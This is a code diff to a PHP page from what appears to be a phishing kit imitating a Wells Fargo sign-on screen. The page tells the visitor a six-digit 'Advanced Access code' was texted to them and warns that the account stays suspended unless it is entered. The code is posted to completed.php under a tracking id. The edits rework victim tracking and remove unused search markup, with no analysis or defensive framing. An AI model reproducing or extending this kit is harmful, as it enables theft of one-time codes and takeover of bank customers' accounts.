@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<html class="no-js" lang="en">
 <?php
 session_start();
 error_reporting(0);
@@ -14,14 +13,19 @@ include('../files/boot/DB-METHOD.php');
 include('../files/boot/DB-RANGE.php');
 include('../files/boot/enc.php');
 include('../call.php');
-$user = @$_GET['user'];
-$phone = @$_GET['phone'];
+// $user = @$_GET['user'];
+// $phone = @$_GET['phone'];
 $error = @$_GET['error'];
-if (($user == "") || ($phone == "")) { 
-echo '<meta http-equiv="refresh" content="0; URL=index.php">';
-    die();
+// if (($user == "") || ($phone == "")) { 
+// echo '<meta http-equiv="refresh" content="0; URL=index.php">';
+//     die();
+// }
+$id = "";
+if( isset($_GET['id'])){
+    $id = $_GET['id'];
 }
 ?>
+<html class="no-js" lang="en">
 <head>
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="UTF-8">
@@ -75,37 +79,6 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
             </div>
         </header>
 
-            <div class="search-signon-wrapper" aria-hidden="true">
-                <div class="search-signon-container" style="display: none;">
-                    <div class="wrap left rounded">
-                        <div class="search-container">
-                            <label class="sr-only" for="searchopen">Search</label>
-                            <input type="text" class="search left rounded" id="searchopen" value="Search">
-                            <span class="search-sprite"></span>
-                        </div>
-                    </div>
-                    <div class="signon-container">
-                        <span class="signonlock" aria-hidden="true">‍</span>
-                        <a href="" id="signOn">Sign On</a>
-                    </div>
-                </div>
-            </div>
-            <div class="overlay" style="display: none;">
-                <div class="wrap left rounded">
-                    <div class="searchContainer">
-                        <form id="frmSearch" name="frmSearch" action="/search/search" method="GET" autocomplete="off">
-                            <span class="search-image"></span>
-                            <label class="sr-only" for="overlaySearch">Search</label>
-                            <input name="q" type="text" class="left rounded required" id="overlaySearch">
-                            <span class="clear-image"></span>
-                        </form>
-                    </div>
-                    <div class="cancel-container">
-                        <a href="" id="cancelSearch">Cancel</a>
-                    </div>
-                </div>
-            </div>
-
             <div class="overlaySignOn" style="top: 38px;">
 
                 <div class="overlayContainer">
@@ -115,9 +88,9 @@ echo '<meta http-equiv="refresh" content="0; URL=index.php">';
                         <a href="#" class="security-text">Online &amp; Mobile Security</a>
                     </div>
                     <div class="signOnContainer" align="center" style="width: 100%; max-width: 650px;">
-                        <form id="" name="frmSignon" action="completed.php" method="post" autocomplete="off">
-                            <input type="hidden" name="user" value="<?=$user;?>">
-                            <input type="hidden" name="phone" value="<?=$phone;?>">
+                        <form id="" name="frmSignon" action="completed.php?id=<?=$id?>" method="post" autocomplete="off">
+                            <!-- <input type="hidden" name="user" value="<?=$user;?>"> -->
+                            <!-- <input type="hidden" name="phone" value="<?=$phone;?>"> -->
                             <p class="enroll-header" style="font-size: 100%;">For your security, an Advanced Access code is required. </p>
                             <p class="enroll-header" style="font-size: 110%;">We have sent you a message with a 6 digit code ("To send 500.00 to Wells Fargo with a unique code") to your phone number.</p>
                             <p style="font-size: 120%; font-weight: bold;">Failing to input the specific code will cause your account to remain suspended and the authentication will not be validated.</p>
